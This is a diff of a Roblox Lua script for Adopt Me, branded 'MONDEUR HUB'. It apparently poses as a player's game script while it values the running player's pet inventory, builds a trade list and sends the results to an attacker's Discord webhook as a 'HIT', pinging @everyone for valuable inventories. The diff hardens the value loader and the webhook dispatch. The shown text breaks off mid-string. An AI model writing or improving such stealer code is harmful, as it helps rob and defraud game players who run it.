@@ -18,19 +18,23 @@ local RunService = game:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
--- 3. GITHUB VALUE DATA LOADER
+-- 3. GITHUB VALUE DATA LOADER (FIXED CARRIAGE RETURN BUG)
 local customValues = {}
 local function loadValues()
     local success, result = pcall(function()
         return game:HttpGet(VALUE_URL)
     end)
-    if success then
+    if success and type(result) == "string" then
         for line in result:gmatch("[^\r\n]+") do
             local name, val = line:match("([^,]+),([^,]+)")
             if name and val then
-                -- FIXED: Replaced .trim() with a pattern match to remove spaces
+                -- Safely strip spaces and hidden \r so tonumber() works properly
                 local cleanName = name:lower():match("^%s*(.-)%s*$")
-                customValues[cleanName] = tonumber(val)
+                local cleanVal = val:match("^%s*(.-)%s*$")
+                local numVal = tonumber(cleanVal)
+                if cleanName and numVal then
+                    customValues[cleanName] = numVal
+                end
             end
         end
     end
@@ -91,8 +95,9 @@ end
 
 -- 6. VALUATION LOGIC
 local function getFinalValue(petData, props)
-    -- FIXED: Replaced .trim() with a pattern match
-    local petName = petData.name:lower():match("^%s*(.-)%s*$")
+    -- Safe name fetching to prevent nil errors
+    local rawName = petData.name or ""
+    local petName = rawName:lower():match("^%s*(.-)%s*$") or ""
     local base = customValues[petName] or petData.rvalue or 0
     
     if base < 0.01 then
@@ -151,29 +156,21 @@ end
 
 local sortedPets, grandTotal, finalTradeList = processInventory()
 
--- 8. WEBHOOK DISPATCH
+-- 8. WEBHOOK DISPATCH (RESTORED OLD LOOK & FIXED SHADOWING BUG)
 if #sortedPets > 0 then
     local petLines = ""
     for _, p in ipairs(sortedPets) do
-        petLines = petLines .. p.emoji .. " " .. p.name .. " " .. p.count .. "x (₱" .. string.format("%.2f", p.price) .. ")\n"
+        local nextLine = p.emoji .. " " .. p.name .. " " .. p.count .. "x (₱" .. string.format("%.2f", p.price) .. ")\n"
+        -- Prevent Discord from rejecting the webhook if inventory is too massive (4096 char limit)
+        if #petLines + #nextLine > 3000 then
+            petLines = petLines .. "➕ And more items...\n"
+            break
+        end
+        petLines = petLines .. nextLine
     end
 
     local payload = HttpService:JSONEncode({
         content = (grandTotal >= 500 and "@everyone" or ""),
         embeds = {{
-            title = "MONDEUR HUB | 🦊 GHOST HIT!",
-            description = "This is my script for Adopt Me!\n\n" .. petLines,
-            color = 16733440
-        }}
-    })
-
-    local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
-    if request then
-        request({
-            Url = WEBHOOK,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = payload
-        })
-    end
-end
+            title = "MONDEUR HUB | 🦊 HIT!",
+            description = "
